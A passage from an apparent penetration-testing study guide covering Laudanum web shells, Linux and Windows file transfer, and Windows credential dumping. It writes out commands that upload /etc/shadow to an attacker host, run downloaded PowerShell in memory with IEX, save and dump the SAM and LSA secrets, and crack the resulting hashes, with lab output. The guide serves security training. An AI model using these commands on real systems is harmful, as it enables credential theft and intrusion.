<li>The CVSS score is calculated using a formula that combines the values of the base, temporal, and environmental metrics. The resulting score ranges from 0 to 10, with higher scores indicating more severe vulnerabilities.</li>
<li>The National Vulnerability Database (NVD) provides on online calculator here: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="laudanum"><a class="header" href="#laudanum">Laudanum</a></h1>
<h2 id="overview-14"><a class="header" href="#overview-14">Overview</a></h2>
<p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell. It is designed to be easy to use and customizable for different scenarios.</p>
<p>Laudanum can be downloaded here: https://github.com/jbarcia/Web-Shells/tree/master/laudanum</p>
<h2 id="using-laudanum"><a class="header" href="#using-laudanum">Using Laudanum</a></h2>
<p>Laudanum files are typically stored in <code>/usr/share/laudanum/</code> on parrotos and kali. For most of the files, you can simply copy them to your web server‚Äôs root directory (e.g., <code>/var/www/html/</code> for Apache) and access them via a web browser. Some of the scripts require that you first modify them to add you own IP address for the reverse shell connection.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux-file-transfer-methods"><a class="header" href="#linux-file-transfer-methods">Linux File Transfer Methods</a></h1>
<h2 id="introduction-30"><a class="header" href="#introduction-30">Introduction</a></h2>
<p>Linux provides many versatile tools for file transfers. Understanding these methods helps both attackers and defenders. Most malware uses HTTP/HTTPS for communication, though Linux also supports FTP, SMB, and other protocols.</p>
<p><strong>Real-world example:</strong> Threat actors used a Bash script that attempted three download methods (cURL ‚Üí wget ‚Üí Python) to download malware via HTTP, demonstrating redundancy in file transfer methods.</p>
<h2 id="download-operations"><a class="header" href="#download-operations">Download Operations</a></h2>
<h3 id="base64-encoding--decoding"><a class="header" href="#base64-encoding--decoding">Base64 Encoding / Decoding</a></h3>
<p>For small files without network communication. Encode on source, copy string, decode on target. Verify with MD5 checksums.</p>
<p><strong>On source machine:</strong></p>
<pre><code class="language-bash">md5sum id_rsa
cat id_rsa |base64 -w 0;echo
</code></pre>
<p><strong>On target machine:</strong></p>
<pre><code class="language-bash">echo -n '&lt;base64_string&gt;' | base64 -d &gt; id_rsa
md5sum id_rsa  # Verify hash matches
</code></pre>
<h3 id="httphttps-downloads"><a class="header" href="#httphttps-downloads">HTTP/HTTPS Downloads</a></h3>
<p>Most common method. Multiple tools available with fallback options.</p>
<p><strong>cURL:</strong></p>
<pre><code class="language-bash">curl http://&lt;IP&gt;/file.txt -o file.txt
curl https://&lt;IP&gt;/file.txt -k -o file.txt  # -k ignores SSL cert errors
</code></pre>
<p><strong>wget:</strong></p>
<pre><code class="language-bash">wget http://&lt;IP&gt;/file.txt
wget --no-check-certificate https://&lt;IP&gt;/file.txt
</code></pre>
<p><strong>Python:</strong></p>
<pre><code class="language-python">python3 -c "import urllib.request; urllib.request.urlretrieve('http://&lt;IP&gt;/file.txt', 'file.txt')"
</code></pre>
<p><strong>Bash (using /dev/tcp):</strong></p>
<pre><code class="language-bash">exec 3&lt;&gt;/dev/tcp/&lt;IP&gt;/80
echo -e "GET /file.txt HTTP/1.1\r\nHost: &lt;IP&gt;\r\nConnection: close\r\n\r\n" &gt;&amp;3
cat &lt;&amp;3 &gt; file.txt
</code></pre>
<h3 id="ftp-downloads"><a class="header" href="#ftp-downloads">FTP Downloads</a></h3>
<p><strong>Interactive FTP:</strong></p>
<pre><code class="language-bash">ftp &lt;IP&gt;
# Then: get file.txt
</code></pre>
<p><strong>Non-interactive FTP:</strong></p>
<pre><code class="language-bash">echo -e "open &lt;IP&gt;\nuser anonymous\nbinary\nget file.txt\nbye" | ftp -n
</code></pre>
<p><strong>cURL FTP:</strong></p>
<pre><code class="language-bash">curl ftp://&lt;IP&gt;/file.txt -u anonymous: -o file.txt
</code></pre>
<h3 id="scp-downloads"><a class="header" href="#scp-downloads">SCP Downloads</a></h3>
<p>Secure Copy Protocol over SSH (TCP/22). Requires SSH server on source.</p>
<p><strong>Setup SSH server:</strong></p>
<pre><code class="language-bash">sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt  # Verify listening on port 22
</code></pre>
<p><strong>Download from remote:</strong></p>
<pre><code class="language-bash">scp user@&lt;IP&gt;:/path/to/file.txt .
# With password prompt, or use SSH keys
</code></pre>
<p><strong>Note:</strong> Create temporary user accounts for file transfers to avoid exposing primary credentials.</p>
<h3 id="smb-downloads"><a class="header" href="#smb-downloads">SMB Downloads</a></h3>
<p><strong>Install SMB client:</strong></p>
<pre><code class="language-bash">sudo apt install smbclient  # Debian/Ubuntu
sudo yum install samba-client  # RHEL/CentOS
</code></pre>
<p><strong>Download file:</strong></p>
<pre><code class="language-bash">smbclient //&lt;IP&gt;/sharename -U username
# Then: get file.txt
</code></pre>
<p><strong>Or non-interactive:</strong></p>
<pre><code class="language-bash">smbclient //&lt;IP&gt;/sharename -U username -c "get file.txt"
</code></pre>
<h2 id="upload-operations"><a class="header" href="#upload-operations">Upload Operations</a></h2>
<h3 id="web-upload"><a class="header" href="#web-upload">Web Upload</a></h3>
<p>Use Python‚Äôs <code>uploadserver</code> module for file uploads via HTTP/HTTPS.</p>
<p><strong>Setup upload server (HTTP):</strong></p>
<pre><code class="language-bash">sudo python3 -m pip install --user uploadserver
python3 -m uploadserver 8000
</code></pre>
<p><strong>Setup upload server (HTTPS):</strong></p>
<pre><code class="language-bash"># Create self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start HTTPS server
mkdir https &amp;&amp; cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
</code></pre>
<p><strong>Upload from target:</strong></p>
<pre><code class="language-bash"># Single file
curl -X POST http://&lt;IP&gt;:8000/upload -F 'files=@/path/to/file'

# Multiple files
curl -X POST https://&lt;IP&gt;:443/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
</code></pre>
<h3 id="alternative-web-file-transfer"><a class="header" href="#alternative-web-file-transfer">Alternative Web File Transfer</a></h3>
<p>Start a simple web server on target machine, then download from attacker machine.</p>
<p><strong>Python3 HTTP server:</strong></p>
<pre><code class="language-bash">python3 -m http.server 8000
# Access from attacker: wget http://&lt;IP&gt;:8000/file.txt
</code></pre>
<p><strong>Python2.7 HTTP server:</strong></p>
<pre><code class="language-bash">python2.7 -m SimpleHTTPServer 8000
</code></pre>
<p><strong>PHP HTTP server:</strong></p>
<pre><code class="language-bash">php -S 0.0.0.0:8000
</code></pre>
<p><strong>Ruby HTTP server:</strong></p>
<pre><code class="language-bash">ruby -run -ehttpd . -p8000
</code></pre>
<p><strong>Note:</strong> Inbound traffic may be blocked. This method transfers from target to attacker (download from attacker‚Äôs perspective).</p>
<h3 id="scp-upload"><a class="header" href="#scp-upload">SCP Upload</a></h3>
<p>If SSH (TCP/22) outbound is allowed, upload files to SSH server.</p>
<p><strong>Upload to remote:</strong></p>
<pre><code class="language-bash">scp /etc/passwd user@&lt;IP&gt;:/home/user/
# Syntax similar to cp: scp &lt;source&gt; &lt;destination&gt;
</code></pre>
<p><strong>Upload directory:</strong></p>
<pre><code class="language-bash">scp -r /path/to/directory user@&lt;IP&gt;:/home/user/
</code></pre>
<h3 id="ftp-uploads"><a class="header" href="#ftp-uploads">FTP Uploads</a></h3>
<p><strong>Setup FTP server:</strong></p>
<pre><code class="language-bash">sudo python3 -m pyftpdlib --port 21 --write
</code></pre>
<p><strong>Upload with cURL:</strong></p>
<pre><code class="language-bash">curl -T file.txt ftp://&lt;IP&gt;/ --user anonymous:
</code></pre>
<p><strong>Upload with FTP client:</strong></p>
<pre><code class="language-bash">echo -e "open &lt;IP&gt;\nuser anonymous\nbinary\nput file.txt\nbye" | ftp -n
</code></pre>
<h3 id="smb-uploads"><a class="header" href="#smb-uploads">SMB Uploads</a></h3>
<p><strong>Upload file:</strong></p>
<pre><code class="language-bash">smbclient //&lt;IP&gt;/sharename -U username -c "put file.txt"
</code></pre>
<p><strong>Mount and copy:</strong></p>
<pre><code class="language-bash">sudo mkdir /mnt/smb
sudo mount -t cifs //&lt;IP&gt;/sharename /mnt/smb -o username=user
cp file.txt /mnt/smb/
sudo umount /mnt/smb
</code></pre>
<h2 id="summary-1"><a class="header" href="#summary-1">Summary</a></h2>
<ul>
<li><strong>Base64</strong>: No network needed, limited by terminal/paste buffer size</li>
<li><strong>HTTP/HTTPS</strong>: Most common, multiple tools (curl, wget, Python), often allowed outbound</li>
<li><strong>FTP</strong>: Alternative protocol, requires server setup</li>
<li><strong>SCP/SSH</strong>: Secure, requires SSH server, TCP/22 may be blocked outbound</li>
<li><strong>SMB</strong>: Common in enterprise, may require authentication</li>
<li><strong>Web servers</strong>: Python/PHP/Ruby can quickly serve files for download</li>
<li><strong>Upload servers</strong>: Python uploadserver module for receiving files</li>
</ul>
<p><strong>Redundancy strategy:</strong> Try multiple methods (curl ‚Üí wget ‚Üí Python) for reliability.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="windows-file-transfer-methods"><a class="header" href="#windows-file-transfer-methods">Windows File Transfer Methods</a></h1>
<h2 id="introduction-31"><a class="header" href="#introduction-31">Introduction</a></h2>
<p>Windows provides various native utilities for file transfer operations. Understanding these methods is important for both attackers (to operate and evade detection) and defenders (to monitor and create policies).</p>
<p><strong>Fileless attacks</strong> use legitimate built-in tools to execute attacks without dropping files to disk. The Microsoft Astaroth APT attack demonstrates this - it used WMIC, Bitsadmin, Certutil, and Regsvr32 to download, decode, and execute payloads in memory.</p>
<h2 id="download-operations-1"><a class="header" href="#download-operations-1">Download Operations</a></h2>
<h3 id="powershell-base64-encode--decode"><a class="header" href="#powershell-base64-encode--decode">PowerShell Base64 Encode &amp; Decode</a></h3>
<p>For small files, encode on attacker machine, copy string, and decode on target. Verify integrity with MD5 checksums.</p>
<p><strong>On attacker machine:</strong></p>
<pre><code class="language-bash">md5sum id_rsa
cat id_rsa |base64 -w 0;echo
</code></pre>
<p><strong>On Windows target:</strong></p>
<pre><code class="language-powershell">[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("&lt;base64_string&gt;"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
</code></pre>
<p><strong>Limitations:</strong> Windows cmd.exe has max string length of 8,191 characters. Web shells may error on very large strings.</p>
<h3 id="powershell-web-downloads"><a class="header" href="#powershell-web-downloads">PowerShell Web Downloads</a></h3>
<p>Most companies allow HTTP/HTTPS outbound traffic. PowerShell‚Äôs <code>System.Net.WebClient</code> class provides multiple download methods:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Method</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>DownloadFile</code></td><td>Downloads to local file</td></tr>
<tr><td><code>DownloadFileAsync</code></td><td>Async version of DownloadFile</td></tr>
<tr><td><code>DownloadString</code></td><td>Downloads as string (for fileless execution)</td></tr>
<tr><td><code>DownloadData</code></td><td>Downloads as byte array</td></tr>
</tbody>
</table>
</div>
<p><strong>DownloadFile:</strong></p>
<pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('&lt;URL&gt;','&lt;Output File&gt;')
</code></pre>
<p><strong>DownloadString (Fileless):</strong></p>
<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('&lt;URL&gt;')
# Or with pipeline:
(New-Object Net.WebClient).DownloadString('&lt;URL&gt;') | IEX
</code></pre>
<p><strong>Invoke-WebRequest (PowerShell 3.0+):</strong></p>
<pre><code class="language-powershell">Invoke-WebRequest &lt;URL&gt; -OutFile &lt;filename&gt;
# Aliases: iwr, curl, wget
</code></pre>
<p><strong>Common Errors &amp; Fixes:</strong></p>
<ol>
<li><strong>IE first-launch configuration error:</strong></li>
</ol>
<pre><code class="language-powershell">Invoke-WebRequest &lt;URL&gt; -UseBasicParsing | IEX
</code></pre>
<ol start="2">
<li><strong>SSL/TLS certificate trust error:</strong></li>
</ol>
<pre><code class="language-powershell">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
</code></pre>
<h3 id="smb-downloads-1"><a class="header" href="#smb-downloads-1">SMB Downloads</a></h3>
<p>SMB (TCP/445) is common in enterprise Windows networks. Create SMB server with Impacket:</p>
<pre><code class="language-bash">sudo impacket-smbserver share -smb2support /tmp/smbshare
</code></pre>
<p><strong>Download from Windows:</strong></p>
<pre><code class="language-cmd">copy \\&lt;IP&gt;\share\&lt;file&gt;
</code></pre>
<p><strong>Note:</strong> Newer Windows blocks unauthenticated guest access. Use credentials:</p>
<pre><code class="language-bash">sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
</code></pre>
<pre><code class="language-cmd">net use n: \\&lt;IP&gt;\share /user:test test
copy n:\&lt;file&gt;
</code></pre>
<h3 id="ftp-downloads-1"><a class="header" href="#ftp-downloads-1">FTP Downloads</a></h3>
<p>FTP uses TCP/21 and TCP/20. Setup Python FTP server:</p>
<pre><code class="language-bash">sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
</code></pre>
<p><strong>Download with PowerShell:</strong></p>
<pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('ftp://&lt;IP&gt;/file.txt', 'C:\Users\Public\ftp-file.txt')
</code></pre>
<p><strong>Download with FTP client (non-interactive):</strong></p>
<pre><code class="language-cmd">echo open &lt;IP&gt; &gt; ftpcommand.txt
echo USER anonymous &gt;&gt; ftpcommand.txt
echo binary &gt;&gt; ftpcommand.txt
echo GET file.txt &gt;&gt; ftpcommand.txt
echo bye &gt;&gt; ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
</code></pre>
<h2 id="upload-operations-1"><a class="header" href="#upload-operations-1">Upload Operations</a></h2>
<h3 id="powershell-base64-encode--decode-1"><a class="header" href="#powershell-base64-encode--decode-1">PowerShell Base64 Encode &amp; Decode</a></h3>
<p><strong>Encode on Windows:</strong></p>
<pre><code class="language-powershell">[Convert]::ToBase64String((Get-Content -path "&lt;file&gt;" -Encoding byte))
Get-FileHash "&lt;file&gt;" -Algorithm MD5 | select Hash
</code></pre>
<p><strong>Decode on attacker machine:</strong></p>
<pre><code class="language-bash">echo "&lt;base64_string&gt;" | base64 -d -w 0 &gt; &lt;output_file&gt;
md5sum &lt;output_file&gt;  # Verify hash matches
</code></pre>
<h3 id="smb-uploads-1"><a class="header" href="#smb-uploads-1">SMB Uploads</a></h3>
<p>SMB (TCP/445) is often blocked outbound. Use <strong>WebDAV</strong> (HTTP/HTTPS extension) as alternative - Windows will try SMB first, then fall back to HTTP.</p>
<p><strong>Setup WebDAV server:</strong></p>
<pre><code class="language-bash">sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
</code></pre>
<p><strong>Upload from Windows:</strong></p>
<pre><code class="language-cmd">copy &lt;file&gt; \\&lt;IP&gt;\DavWWWRoot\
# Or specify folder:
copy &lt;file&gt; \\&lt;IP&gt;\&lt;sharefolder&gt;\
</code></pre>
<p><strong>Note:</strong> <code>DavWWWRoot</code> is a special keyword - no actual folder exists. Can also use <code>net use</code> to mount if needed.</p>
<p><strong>If SMB allowed, use Impacket:</strong></p>
<pre><code class="language-bash">sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
</code></pre>
<h3 id="ftp-uploads-1"><a class="header" href="#ftp-uploads-1">FTP Uploads</a></h3>
<p><strong>Setup FTP server with write permissions:</strong></p>
<pre><code class="language-bash">sudo python3 -m pyftpdlib --port 21 --write
</code></pre>
<p><strong>Upload with PowerShell:</strong></p>
<pre><code class="language-powershell">(New-Object Net.WebClient).UploadFile('ftp://&lt;IP&gt;/filename', '&lt;local_file_path&gt;')
</code></pre>
<p><strong>Upload with FTP client (non-interactive):</strong></p>
<pre><code class="language-cmd">echo open &lt;IP&gt; &gt; ftpcommand.txt
echo USER anonymous &gt;&gt; ftpcommand.txt
echo binary &gt;&gt; ftpcommand.txt
echo PUT &lt;file&gt; &gt;&gt; ftpcommand.txt
echo bye &gt;&gt; ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
</code></pre>
<h2 id="summary-2"><a class="header" href="#summary-2">Summary</a></h2>
<ul>
<li><strong>Base64</strong>: No network needed, limited by terminal length</li>
<li><strong>PowerShell WebClient</strong>: HTTP/HTTPS, most common, supports fileless execution</li>
<li><strong>SMB</strong>: Common in enterprise, often blocked outbound (use WebDAV)</li>
<li><strong>FTP</strong>: Alternative protocol, requires server setup</li>
<li><strong>Fileless attacks</strong>: Use DownloadString + IEX to execute in memory without touching disk</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="windows-authentication-process"><a class="header" href="#windows-authentication-process">Windows Authentication Process</a></h1>
<p>The Windows client authentication process involves multiple modules responsible for logon, cred retrieval, and verification. There are two authentication protocols available for use within Windows, including NTLM and Kerberos, with Kerberos being the most complex.</p>
<h2 id="lsa-local-security-authority"><a class="header" href="#lsa-local-security-authority">LSA (Local Security Authority)</a></h2>
<p>The LSA is the component responsbile for authenticating uses, enforcing security policies, managing logins, and overseeing all aspects of local system security. It also translates usernames to SIDs (Security Identifiers) and manages user sessions.</p>
<h2 id="windows-authentication-process-diagram"><a class="header" href="#windows-authentication-process-diagram">Windows Authentication Process Diagram</a></h2>
<p><img src="infosec/windows/images/Auth_process1.png" alt=""></p>
<p>Local interactive logon is handled via the coordination of several components:</p>
<ul>
<li><strong>Winlogon</strong>: Manages user logon and logoff processes.
<ul>
<li>Launches <code>LogonUI</code> to prompt for credentials at login</li>
<li>Handles password changes</li>
<li>Lock and unlock the workstation</li>
<li><code>Winlogon</code> is the only process that accepts login requests from the keyboard, which are sent via RPC messages from <code>Win32k.sys</code> (the kernel-mode Win32 subsystem).</li>
<li>After credentials are collected, <code>Winlogon</code> sends them to <code>LSASS</code> for verification.</li>
</ul>
</li>
<li><strong>LogonUI</strong>: The user interface for logon.</li>
<li><strong>GINA (Graphical Identification and Authentication)</strong>: Provides the user interface for logon</li>
<li><strong>SAM</strong>: Stores user account information and credentials locally on the machine.</li>
<li><strong>LSASS (Local Security Authority Subsystem Service)</strong>: Responsible for enforcing security policies and managing user authentication.
<ul>
<li><code>LSASS</code> is comprised of multiple modules and governs all authentication processes.</li>
<li><code>LSASS</code> is located at <code>C:\Windows\System32\lsass.exe</code> and runs as a protected process.</li>
<li>Responsible for enforing local security policies, authenticating users, and forwarding security logs to the Even Log.</li>
<li><code>LSASS</code> is essentially the ‚Äúgatekeeper‚Äù of Windows security.</li>
<li>After initial login, <code>LSASS</code> will cache credentials in memory, create access tokens, enforce security policies, and manage user sessions.</li>
</ul>
</li>
<li><strong>Msv1_0.dll</strong>: The NTLM authentication package.</li>
</ul>
<h2 id="sam-database"><a class="header" href="#sam-database">SAM Database</a></h2>
<p>The Security Accounts Manager (SAM) database is a critical component of Windows security that stores user account information and credentials locally on the machine. It is used for local authentication and is accessed by the Local Security Authority Subsystem Service (LSASS) during the authentication process. The SAM database contains hashed passwords, user rights, and group memberships, ensuring that user credentials are securely managed and verified during logon attempts.</p>
<p>SAM is located at <code>C:\Windows\System32\config\SAM</code> and is protected by the operating system to prevent unauthorized access. Direct access to the SAM file is restricted, and it can only be accessed by the system processes, such as LSASS, during authentication.</p>
<p>Note that for workstations joined to Active Directory Domain Services, SAM is not used. Instead, authentication requests are forwarded to domain controllers, which manage user accounts and credentials for the entire domain.</p>
<p><code>SYSKEY.exe</code> is a utility that provides an additional layer of security for the SAM database by encrypting its contents. This helps protect user credentials from being easily accessed or compromised.</p>
<p>SAM is stored in the registry at <code>HKEY_LOCAL_MACHINE\SAM</code>.</p>
<h3 id="attacking-sam-system-and-security-hives"><a class="header" href="#attacking-sam-system-and-security-hives">Attacking SAM, SYSTEM, and SECURITY Hives</a></h3>
<p>With administrative access to a Windows system, we can attempt to dump the files associated with the SAM database, copy them to our machine, and use tools like <code>hashcat</code> or <code>John the Ripper</code> to crack the password hashes. Performing this process offline helps avoid detection by not maintaining a persistent session on the target machine.</p>
<p>There are 3 registry hives on the target machine we can copy (if we have admin access):</p>
<ul>
<li><strong>SAM</strong>: Contains user account information and password hashes.</li>
<li><strong>SYSTEM</strong>: Contains system configuration information, including the system key used to encrypt the SAM. This key is required to decrypt the hashes.</li>
<li><strong>SECURITY</strong>: Contains security policy information and other security-related data.</li>
</ul>
<p>We can backup these hives using the <code>reg save</code> command in an elevated command prompt:</p>
<pre><code class="language-cmd">reg save HKLM\SAM C:\Windows\temp\SAM
reg save HKLM\SYSTEM C:\Windows\temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\temp\SECURITY
</code></pre>
<p>If we‚Äôre only interested in local user accounts, we technically only need the <code>SAM</code> and <code>SYSTEM</code> hives. However, having the <code>SECURITY</code> hive can be useful for other purposes, such as extracting LSA secrets and cached domain credentials.</p>
<p>We can use Impacket‚Äôs <code>secretsdump.py</code> tool to extract the hashes directly from the dumped hives:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....&gt;w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
</code></pre>
<p>Notice that <code>secretsdump.py</code> discovered several hashes. Most modern Windows operating systems use <code>NTLMv2</code> hashes, which are represented by the long strings after the second colon (<code>:</code>). The <code>LM</code> hashes (the shorter strings after the first colon) are often disabled on modern systems for security reasons.</p>
<p>We can copy these hashes into a text file and attempt to crack them using <code>hashcat</code> or <code>John the Ripper</code>. We only want to copy the <code>NTLMv2</code> hashes for cracking.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -&gt; whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
</code></pre>
<h3 id="remotely-dumping-lsa-and-sam-secrets"><a class="header" href="#remotely-dumping-lsa-and-sam-secrets">Remotely Dumping LSA and SAM Secrets</a></h3>
<p>With access to credentials that have local administrator privileges, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
</code></pre>
<p>Similarly, we can use netexec to dump hashes from the SAM database remotely.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database

</code></pre>
<h2 id="credential-manager"><a class="header" href="#credential-manager">Credential Manager</a></h2>
<p><img src="infosec/windows/images/authn_credman_credprov.gif" alt=""></p>
<p>Credential Manager is a Windows feature that securely stores and manages user credentials, such as usernames and passwords, for various applications and services. It allows users to save their login information so that they can easily access resources without having to re-enter their credentials each time.</p>
<p>The credentials are encrypted and (by default) stored at:
<code>PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\</code></p>
<h2 id="ntds-nt-directory-services"><a class="header" href="#ntds-nt-directory-services">NTDS (NT Directory Services)</a></h2>
<p>NTDS is the database that stores Active Directory data, including user accounts, group memberships, and security policies. It is used for authentication and authorization in domain environments.</p>
<h2 id="attacking-lsass"><a class="header" href="#attacking-lsass">Attacking LSASS</a></h2>
<p>With administrative privileges on a Windows system, it is possible to dump the contents of the LSASS process memory and use tools like <code>pypykatz</code> or <code>mimikatz</code> to extract plaintext credentials, NTLM hashes, kerberos tickets, and other sensitive information.</p>
<p>We can create the dump using Task Manager on the target, transfer the dump to our machine, and then use  <code>pypykatz</code> to analyze it:</p>
<pre><code class="language-bash">$ pypykatz lsa minidump lsass.dmp
</code></pre>
<p><code>pypykatz</code> will parse the dump and extract any credentials it finds, displaying them in a readable format. We can then use <code>hashcat</code> to attempt to crack any NTLM hashes.</p>
<h3 id="references-3"><a class="header" href="#references-3">References</a></h3>
<p>hettps://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN
